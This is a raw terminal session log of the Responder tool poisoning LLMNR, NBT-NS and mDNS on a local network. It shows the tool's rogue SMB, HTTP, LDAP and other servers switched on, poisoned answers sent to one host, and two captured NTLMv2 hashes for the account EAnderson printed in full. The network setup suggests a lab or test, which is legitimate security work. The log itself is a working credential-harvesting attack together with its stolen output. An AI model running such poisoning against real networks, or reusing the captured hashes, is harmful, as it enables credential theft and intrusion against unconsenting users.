Script started on 2024-03-30 06:59:49-04:00 [COMMAND="sudo responder -I eth0 -Pv" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="213" LINES="24"]

[1;32m[+] [0mPoisoners:
    LLMNR                      [1;32m[ON][0m
    NBT-NS                     [1;32m[ON][0m
    MDNS                       [1;32m[ON][0m
    DNS                        [1;32m[ON][0m
    DHCP                       [1;31m[OFF][0m

[1;32m[+] [0mServers:
    HTTP server                [1;32m[ON][0m
    HTTPS server               [1;32m[ON][0m
    WPAD proxy                 [1;31m[OFF][0m
    Auth proxy                 [1;32m[ON][0m
    SMB server                 [1;32m[ON][0m
    Kerberos server            [1;32m[ON][0m
    SQL server                 [1;32m[ON][0m
    FTP server                 [1;32m[ON][0m
    IMAP server                [1;32m[ON][0m
    POP3 server                [1;32m[ON][0m
    SMTP server                [1;32m[ON][0m
    DNS server                 [1;32m[ON][0m
    LDAP server                [1;32m[ON][0m
    MQTT server                [1;32m[ON][0m
    RDP server                 [1;32m[ON][0m
    DCE-RPC server             [1;32m[ON][0m
    WinRM server               [1;32m[ON][0m
    SNMP server                [1;31m[OFF][0m

[1;32m[+] [0mHTTP Options:
    Always serving EXE         [1;31m[OFF][0m
    Serving EXE                [1;31m[OFF][0m
    Serving HTML               [1;31m[OFF][0m
    Upstream Proxy             [1;31m[OFF][0m

[1;32m[+] [0mPoisoning Options:
    Analyze Mode               [1;31m[OFF][0m
    Force WPAD auth            [1;31m[OFF][0m
    Force Basic Auth           [1;31m[OFF][0m
    Force LM downgrade         [1;31m[OFF][0m
    Force ESS downgrade        [1;31m[OFF][0m

[1;32m[+] [0mGeneric Options:
    Responder NIC              [1;35m[eth0][0m
    Responder IP               [1;35m[192.168.15.147][0m
    Responder IPv6             [1;35m[fe80::fcfc:9003:91d8:1fca][0m
    Challenge set              [1;35m[random][0m
    Don't Respond To Names     [1;35m['ISATAP', 'ISATAP.LOCAL'][0m

[1;32m[+] [0mCurrent Session Variables:
    Responder Machine Name     [1;35m[WIN-OE8A24HCTE6][0m
    Responder Domain Name      [1;35m[LS8V.LOCAL][0m
    Responder DCE-RPC Port     [1;35m[49332][0m
[1;32m
[+][0m Listening for events...

[1;32m[*] [NBT-NS] Poisoned answer sent to 192.168.15.170 for name ACTIVEDIRECTORY (service: Domain Master Browser)[0m
[1;32m[*] [NBT-NS] Poisoned answer sent to 192.168.15.170 for name ACTIVEDIRECTORY (service: Domain Master Browser)[0m
[1;32m[*] [NBT-NS] Poisoned answer sent to 192.168.15.170 for name ACTIVEDIRECTORY (service: Domain Master Browser)[0m
[1;34m[SMB][0m NTLMv2-SSP Client   : [0;33m192.168.15.170[0m
[1;34m[SMB][0m NTLMv2-SSP Username : [0;33mACTIVEDIRECTORY\EAnderson[0m
[1;34m[SMB][0m NTLMv2-SSP Hash     : [0;33mEAnderson::ACTIVEDIRECTORY:f60490353ea42f53:9205937DF7690A2C2507D30E173C6D54:010100000000000080E01DDB6F82DA01F1A9D8C1EED159C000000000020008004C0053003800560001001E00570049004E002D004F00450038004100320034004800430054004500360004003400570049004E002D004F0045003800410032003400480043005400450036002E004C005300380056002E004C004F00430041004C00030014004C005300380056002E004C004F00430041004C00050014004C005300380056002E004C004F00430041004C000700080080E01DDB6F82DA0106000400020000000800300030000000000000000100000000200000CA79DD551AABC9CC934BC05E3AEA67BD890FCEBF6E10CA8C8EEAF277C01E64DB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310035002E003100340037000000000000000000[0m
[1;34m[SMB][0m NTLMv2-SSP Client   : [0;33m192.168.15.170[0m
[1;34m[SMB][0m NTLMv2-SSP Username : [0;33mACTIVEDIRECTORY\EAnderson[0m
[1;34m[SMB][0m NTLMv2-SSP Hash     : [0;33mEAnderson::ACTIVEDIRECTORY:ce0794104c212adc:1BBD2DC0E87A703035C615A8550E6FFF:010100000000000080E01DDB6F82DA013852B491A866953700000000020008004C0053003800560001001E00570049004E002D004F00450038004100320034004800430054004500360004003400570049004E002D004F0045003800410032003400480043005400450036002E004C005300380056002E004C004F00430041004C00030014004C005300380056002E004C004F00430041004C00050014004C005300380056002E004C004F00430041004C000700080080E01DDB6F82DA0106000400020000000800300030000000000000000100000000200000CA79DD551AABC9CC934BC05E3AEA67BD890FCEBF6E10CA8C8EEAF277C01E64DB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310035002E003100340037000000000000000000[0m

Script done on 2024-03-30 07:00:21-04:00 [COMMAND_EXIT_CODE="0"]
